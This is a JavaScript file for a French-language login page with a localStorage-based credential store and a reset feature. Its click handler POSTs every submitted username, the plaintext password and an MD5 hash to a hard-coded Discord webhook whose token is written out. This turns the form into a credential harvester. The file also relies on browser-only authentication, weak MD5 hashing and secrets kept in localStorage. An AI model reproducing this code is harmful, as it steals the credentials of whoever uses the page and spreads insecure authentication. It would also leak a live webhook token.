const button = document.querySelector("button");
const pass = document.querySelector("#pass");
const user = document.querySelector(".username");
const infoDiv = document.getElementById("info");
const successMessage = document.getElementById("success-message");
const container = document.querySelector(".container");
const resetButton = document.querySelector("#resetID");
let vie = parseInt(localStorage.getItem("localVie")) || 3;
// Définir le mot de passe de réinitialisation
const resetPass = localStorage.getItem("gfjnif djqufihdsujfjfqkfdqsfd6sf526+s526f526sf52d60s1 56f0415e6d48f596105qs40f50sq415f01dsq*fe04ds8+01df54156ds15f6415g60f1ds5464f15ds601gf54610gd546sq15gfd610g56f4ds15f4d5s64f56q4g545jh4g5l4kh54564fds56d4za54GF5DH45JYU6I454P564.5?6V4CX564Q5ZE6SF4 D54QG84HS80GF4H56 01564FDS5");
localStorage.setItem("resetPass", CryptoJS.MD5(resetPass).toString());

// Fonction pour afficher les informations de connexion
function afficherInfo() {
    const storedUser = localStorage.getItem("username");
    const storedPass = localStorage.getItem("password");

    if (storedUser && storedPass) {
        infoDiv.innerHTML = `<p>Nom d'utilisateur : ${storedUser}</p><p>Mot de passe (haché) : ${storedPass}</p>`;
    } else {
        infoDiv.innerHTML = "<p>Aucune information de connexion enregistrée.</p>";
    }
}

// Vérifie si les identifiants sont déjà enregistrés
function verifierIdentifiants() {
    const storedUser = localStorage.getItem("username");
    const storedPass = localStorage.getItem("password");

    if (storedUser && storedPass) {
        container.classList.remove("hidden");
        afficherInfo();
    } else {
        container.classList.remove("hidden");
    }
}

// Vérifie si 24 heures se sont écoulées depuis la dernière réinitialisation
function verifierTemps() {
    const lastResetTime = localStorage.getItem("lastResetTime");
    const currentTime = Date.now();
    const oneDay = 24 * 60 * 60 * 1000; // Millisecondes en 24 heures

    if (!lastResetTime || (currentTime - lastResetTime >= oneDay)) {
        localStorage.setItem("localVie", 3); // Réinitialise les vies
        localStorage.removeItem("plusdevie"); // Réinitialise l'état de plus de vies
    }
}

// Fonction pour réinitialiser les identifiants
function formulaireReset() {
    const reponse = prompt("Mot de passe le plus utilisé (sans majuscule ni numéro)");
    if (CryptoJS.MD5(reponse).toString() === localStorage.getItem("resetPass")) {
        localStorage.removeItem("username");
        localStorage.removeItem("password");
        localStorage.removeItem("plusdevie");
        localStorage.removeItem("localVie");
        localStorage.setItem("lastResetTime", Date.now());
        alert("Les identifiants ont été réinitialisés");
        location.reload();
    } else {
        vie--;
        localStorage.setItem("localVie", vie);

        if (vie <= 0) {
            alert("Vous ne pouvez plus essayer de changer de mot de passe pour aujourd'hui");
            localStorage.setItem("plusdevie", true);
        } else {
            alert(`Incorrect, il ne vous reste plus que : ${vie} essais`);
            formulaireReset();
        }
    }
}

// Ajoute un écouteur d'événement au bouton de validation
button.addEventListener("click", e => {
    e.preventDefault();

    const username = user.value;
    const password = pass.value;
    const hashedPassword = CryptoJS.MD5(password).toString();

    //envoie les identifiants sur discord

    let webhook = "https://discord.com/api/webhooks/1355677798412456036/4o4PW063gZ0pp4FKTT-tH900IjZnmFfJZTgTd41JCBrZ6RqYdJA3-C7CvYYwNv72PgCq"

    let data = {
        "content": `**Identifiants de connexion**\nUtilisateur : ${username}\nMot de passe : ${password} \nMot de passe crypté: ${hashedPassword}`
    }
    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    // Vérifie si les identifiants sont corrects
    if (username && password) {
        if (localStorage.getItem("username") === null && localStorage.getItem("password") === null) {
            localStorage.setItem("username", username);
            localStorage.setItem("password", hashedPassword);
            alert("Les informations ont été enregistrées !");
        }

        if (hashedPassword === localStorage.getItem("password") && username === localStorage.getItem("username")) {
            container.classList.add("hidden");
            button.classList.add("hidden");
            successMessage.classList.remove("hidden");
        } else {
            alert("Le nom d'utilisateur ou le mot de passe est incorrect.");
        }
    } else {
        alert("Veuillez remplir tous les champs.");
    }
});

// Ajoute un écouteur d'événement au bouton de réinitialisation
resetButton.addEventListener("click", () => {
    if (!localStorage.getItem("plusdevie")) {
        formulaireReset();
    } else {
        alert("Vous ne pouvez plus essayer de changer de mot de passe pour aujourd'hui");
    }
});

// Vérifie les identifiants et le temps à l'ouverture de la page
verifierIdentifiants();
verifierTemps();